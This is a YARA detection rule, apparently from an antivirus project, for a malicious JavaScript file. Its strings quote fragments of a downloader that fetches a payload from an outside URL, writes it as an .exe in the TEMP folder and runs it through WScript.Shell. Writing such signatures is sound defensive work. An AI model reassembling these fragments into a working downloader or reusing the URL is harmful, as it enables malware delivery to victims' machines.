rule sig_20160330_5495428e1e5dd8e76d425199baef6966 {
  meta:
    description = "datamaliciousorder - file 20160330_5495428e1e5dd8e76d425199baef6966.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "d5bd882485e328f847390f645fb498fd53d740d9e8bc5defb24be1e9f3aab9b9"

  strings:
    $s1  = "GZ[ZK](\"GET\", \"http://a-ntsuhan.com/k38sav\", false);" fullword ascii
    $s2  = "function YJ(RZ, Y0){X0 = X0 * 1; return RZ - Y0;};" fullword ascii
    $s3  = "var WI = function X() {return WScript[YR](\"WScript\"+\".Shell\");}(), X1 = 11;" fullword ascii
    $s4  = "if (GZ[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function K(){return J + \"\";};" fullword ascii
    $s6  = "function ZX() {return WI[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"D7yopyaj.ex\" + \"e\";};" fullword ascii
    $s7  = "function ZT(QK){WI[\"Run\"](QK, X0, X0);};" fullword ascii
    $s8  = "function Z() {return ((L == true) && (L == Y)) ? 1 : X0;};" fullword ascii
    $s9  = "}while (SQ);" fullword ascii
    $s10 = "function U(){return YR;};" fullword ascii
    $s11 = "var PY = new this[\"Date\"]();" fullword ascii
    $s12 = "function FH()" fullword ascii
    $s13 = "function P(PL) {var H1 = (1, 2, 3, 4, 5, PL); return H1;};" fullword ascii
    $s14 = "return YJ(O, TT);" fullword ascii
    $s15 = "function ZG(){return 22;};" fullword ascii
    $s16 = "Y = true; " fullword ascii
    $s17 = "var Y = false;" fullword ascii
    $s18 = "var L = false;" fullword ascii
    $s19 = "L = true; " fullword ascii
    $s20 = "var QE = false;" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}